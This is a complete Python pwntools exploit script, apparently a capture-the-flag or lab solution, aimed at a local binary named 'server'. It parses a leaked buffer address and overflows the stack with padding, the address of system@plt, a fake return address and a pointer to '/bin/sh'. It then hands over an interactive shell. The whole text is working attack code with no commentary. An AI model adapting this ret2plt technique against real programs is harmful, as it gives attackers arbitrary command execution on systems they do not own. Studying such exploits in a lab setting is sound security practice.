from pwn import *


p = process("./server")

data = p.recvuntil("Input some text: ")
data = data.split(b"\n")
data = list(filter(lambda x: b"0x" in x, data))[0].split(b" ")[0]
print(data)

buffer_address = int(data.decode(), 16)
print("Address of buffer {}".format(hex(buffer_address)))

system_plt = 0x08048420
PADDING_LEN = 60

COMMAND = b'/bin/sh' + b'\x00'

payload = b'A' * PADDING_LEN
payload += p32(system_plt)
payload += b'\x00\x00\x00\x00'  # trash
payload += p32(buffer_address + PADDING_LEN + 4 + 4 + 4)
payload += COMMAND

print(payload)
print(len(payload))

p.sendline(payload)

p.interactive()
p.close()
